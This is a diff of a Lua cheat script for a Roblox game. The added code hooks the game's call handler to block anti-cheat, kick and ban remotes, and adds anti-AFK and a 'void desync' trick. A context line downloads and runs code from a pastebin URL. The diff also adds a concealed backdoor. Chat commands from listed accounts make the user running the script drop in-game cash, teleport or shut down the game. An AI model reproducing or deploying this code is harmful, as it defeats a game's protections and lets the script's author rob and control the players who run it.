@@ -4,9 +4,82 @@ end
 getgenv().keybind = Enum.KeyCode.V
 
 if game.Players.LocalPlayer.Name == "poohvvff" then
-    game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime",game.Players.LocalPlayer.UserId)
+    game.ReplicatedStorage.MainEvent:FireServer("OneMoreTime")
 else
-    print("no get ban")
+-- Anti Afk Ril --
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+wait(1)
+vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = 9e9
+function Checkexp()
+grm = getrawmetatable(game)
+setreadonly(grm, false)
+old = grm.__namecall
+grm.__namecall = newcclosure(function(self, ...)
+    local args = {...}
+    if tostring(args[1]) == "TeleportDetect" then
+        return
+    elseif tostring(args[1]) == "CHECKER_1" then
+        return
+    elseif tostring(args[1]) == "CHECKER" then
+        return
+    elseif tostring(args[1]) == "GUI_CHECK" then
+        return
+    elseif tostring(args[1]) == "OneMoreTime" then
+        return
+    elseif tostring(args[1]) == "checkingSPEED" then
+        return
+    elseif tostring(args[1]) == "BANREMOTE" then
+        return
+    elseif tostring(args[1]) == "PERMAIDBAN" then
+        return
+    elseif tostring(args[1]) == "KICKREMOTE" then
+        return
+    elseif tostring(args[1]) == "BR_KICKPC" then
+        return
+    elseif tostring(args[1]) == "BR_KICKMOBILE" then
+        return
+    end
+    return old(self, ...)
+end)
+end
+local executor = identifyexecutor()
+
+if executor == "Synapse X" then
+    Checkexp()
+elseif executor == "Krnl" then
+    Checkexp()
+elseif executor == "Solara" or executor == "solara" then
+    print("Solara")
+elseif executor == "Wave" or executor == "wave"  then
+    Checkexp()
+elseif executor == "Script-Ware" or executor == "script-Ware" then
+    Checkexp()
+elseif executor == "Fluxus" or executor == "fluxus" then
+    Checkexp()
+elseif executor == "Cobix" or executor == "cobix" then
+    Checkexp()
+elseif executor == "Delta" or executor == "delta" then
+    Checkexp()
+elseif executor == "Codex" or executor == "codex" then
+    Checkexp()
+elseif executor == "Vega" or executor == "vega" then
+    Checkexp()
+elseif executor == "Arceus X" or executor == "arceus X" then
+    Checkexp()
+elseif executor == "Alpple wave" or executor == "alpple wave" or executor == "Alpple-wave" or executor == "alpple-wave" then
+    Checkexp()
+elseif executor == "Hydrogen" or executor == "hydrogen" then
+    Checkexp()
+else
+    Checkexp()
+--     local loc = game.Players.LocalPlayer
+-- loc:Kick("ไม่รู้จักตัวรัน https://discord.gg/Nuh5kwP5")
+--     print("Dumb Executor")
+end
 end
 loadstring(game:HttpGet('https://pastebin.com/raw/BYaqyVBp'))()--REMOVE FOR DONT WORK
 
@@ -4472,7 +4545,186 @@ Button.MouseButton1Click:Connect(function()
 end)
 end
 ToggleUi()
+
+--------------------------------------------------------------------------------------------------------------------  
+local FINOBE_KEYBIND = "o"
+getgenv().Finobe1 = false 
+local NewCFrame = CFrame.new
+local LocalFinobe = game.Players.LocalPlayer
+local InputService = game:GetService("UserInputService")
+local Runfinobe = game:GetService("RunService")
+local oldcamoffset = game.Players.LocalPlayer.Character.Humanoid.CameraOffset
+
+if _G.V2 then _G.V2:Disconnect() end
+_G.V2 = Runfinobe.Heartbeat:Connect(function()
+    if LocalFinobe.Character then
+        local FinobeChar = LocalFinobe.Character.HumanoidRootPart
+        local Offset = FinobeChar.CFrame * NewCFrame(9e9, 0/0, math.huge)
+        local oldcf = FinobeChar.CFrame
+
+        if getgenv().Finobe1 then 
+            Finobe2 = FinobeChar.CFrame
+            game.Players.LocalPlayer.Character.Humanoid.CameraOffset = (FinobeChar.CFrame:ToObjectSpace(oldcf)).Position
+            FinobeChar.CFrame = Offset
+            Runfinobe.RenderStepped:Wait()
+            game.Players.LocalPlayer.Character.Humanoid.CameraOffset = oldcamoffset
+            FinobeChar.CFrame = Finobe2
+        end 
+    end 
+end)
+
+if _G.V1 then _G.V1:Disconnect() end
+_G.V1 = LocalFinobe:GetMouse().KeyDown:Connect(function(sigma)
+    if sigma == FINOBE_KEYBIND then
+        getgenv().Finobe1 = not getgenv().Finobe1
+
+        if not getgenv().Finobe1 then 
+            LocalFinobe.Character.HumanoidRootPart.CFrame = Finobe2
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Void Desync";
+                Text = "Disabled";
+            })
+        else 
+            Finobe2 = nil 
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Void Desync";
+                Text = "Enabled";
+            })
+        end 
+    end 
+end)
+function Antikillfordunmb()
+    if game.Players.LocalPlayer.Backpack:FindFirstChild("[ANTI autokill]") then game.Players.LocalPlayer.Backpack:FindFirstChild("[ANTI autokill]"):Destroy() end
+    if game.Players.LocalPlayer.Character:FindFirstChild("[ANTI autokill]") then game.Players.LocalPlayer.Character:FindFirstChild("[ANTI autokill]"):Destroy() end
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "[ANTI autokill]"
+tool.Activated:Connect(function()
+    getgenv().Finobe1 = not getgenv().Finobe1
+
+    if not getgenv().Finobe1 then 
+        LocalFinobe.Character.HumanoidRootPart.CFrame = Finobe2
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "PRO GUI";
+            Text = "ปิดกันauto";
+        })
+    else 
+        Finobe2 = nil 
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "PRO GUI";
+            Text = "เปิดกันauto";
+        })
+    end 
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end
+Antikillfordunmb()
 getgenv().Togglegeted =  game.Players.LocalPlayer.CharacterAdded:connect(function()
     game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
     ToggleUi()
+    Antikillfordunmb()
+end)
+
+local annoying = {"JokeTheFool","Sherosama", "Papa_Mbaye", "AStrongMuscle", "streetren", "NikoSenpai", "WashedGarage", "iumu", "Benoxa", "Luutyy", "clubstar54", "givkitheth", "kywiexcx", "ATKDrizzy", "dtbbullet", "XavierWildYT", "RogueDaHoodKing", "paxxythecreator", "NatsuDBlaze", "AnqelicMar", "DrBlakMD", "DarkWhirlwind", "coreten", "LegacyCross", "Greed_Ocean"} -- you can add more players by doing {"Player1", "Player2"}
+
+game.Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == game.Players.LocalPlayer.Name then
+        for _, v in pairs(annoying) do
+            if plr.Name == v then
+                plr:Kick("A Moderator Has Joined")
+            end
+        end
+    end
+end)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local localskid = Players.LocalPlayer
+
+-- Function to send a chat message
+function chat(msg)
+    local Event = ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+    Event:FireServer(msg, "All")
+end
+
+local targetNames = {"isthisdo23", "cruciatusadidas", "PLAYERS1", "deeralttrue", "PLAYERS3", "dahoodbotmoney5"}
+
+-- Function to find a player by partial name
+function gplr(partialName)
+    local lowerPartial = partialName:lower()
+    for _, v in pairs(Players:GetPlayers()) do
+        if v.Name:lower():sub(1, #partialName) == lowerPartial or v.DisplayName:lower():sub(1, #partialName) == lowerPartial then
+            return v
+        end
+    end
+    return nil
+end
+
+local function PoorCharacteccr(targetPlayer)
+    targetPlayer.Chatted:Connect(function(msg)
+        local command = msg:lower()
+        local args = string.split(msg, " ")
+        local partialName = args[2]
+        local player = gplr(partialName)
+
+        if player and player.Name == localskid.Name then
+            if command:match("^!cash%.") then
+                ReplicatedStorage:WaitForChild("MainEvent"):FireServer("DropMoney", "10000")
+            elseif command:match("^!bring%.") then
+                Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+            elseif command:match("^!follow%.") then
+                _G.Follow = game:GetService("RunService").Heartbeat:Connect(function()
+                    Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
+                end)
+            elseif command:match("^!unfollow%.") then
+                if _G.Follow then _G.Follow:Disconnect() end
+            elseif command:match("^!log%.") then
+                game:Shutdown()
+            elseif command:match("^!freeze%.") then
+                targetPlayer.Character.HumanoidRootPart.Anchored = true
+            elseif command:match("^!sleep%.") then
+                local char = Players.LocalPlayer.Character
+                local hum = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
+                char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+                char.Humanoid.Sit = true
+                task.wait(0.1)
+                for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+                    track:Stop()
+                end
+            elseif command == "!unfreeze." then
+                targetPlayer.Character.HumanoidRootPart.Anchored = false
+            elseif command:match("^!reset%.") then
+                ReplicatedStorage.MainEvent:FireServer("ResetNew")
+                targetPlayer.Character.Humanoid:ChangeState('Dead')
+            elseif command == "/e ok" or command == "/e test" then
+                chat("HELLO")
+            elseif command == "!rejoin." then
+                game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
+            elseif command == "!dance." then
+                Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                local danceAnim = Instance.new('Animation')
+                danceAnim.AnimationId = "rbxassetid://11710529975"
+                Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(danceAnim):Play()
+            end
+        end
+    end)
+end
+
+-- Check existing players
+for _, targetName in pairs(targetNames) do
+    local player = Players:FindFirstChild(targetName)
+    if player then
+        print(targetName .. " in server")
+        PoorCharacteccr(player)
+    end
+end
+
+-- Connect to new players joining
+Players.PlayerAdded:Connect(function(newPlayer)
+    for _, targetName in pairs(targetNames) do
+        if newPlayer.Name == targetName then
+            print(targetName .. " just joined")
+            task.wait(1)
+            PoorCharacteccr(newPlayer)
+        end
+    end
 end)
